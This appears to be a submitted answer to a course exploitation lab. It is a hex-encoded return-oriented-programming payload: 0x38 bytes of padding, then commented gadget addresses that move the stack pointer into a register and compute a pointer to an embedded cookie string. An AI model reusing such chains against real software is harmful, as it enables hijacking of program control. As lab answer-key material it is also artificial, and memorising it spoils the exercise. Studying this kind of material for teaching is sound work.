/* begin: rsp = random */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* above is 0x38 byte */
/* cookies's string = 34 30 63 31 35 31 33 30 00  */
/* mov rax, rsp */
a4 1c 40 00 00 00 00 00
/* mov rdi, rax */
94 1b 40 00 00 00 00 00
/* lea rax, [rdi][rsi=30] */
ce 1b 40 00 00 00 00 00
/* mov rdi, rax */
94 1b 40 00 00 00 00 00
f6 1a 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
34 30 63 31 35 31 33 30
00 00 00 00 00 00 00 00
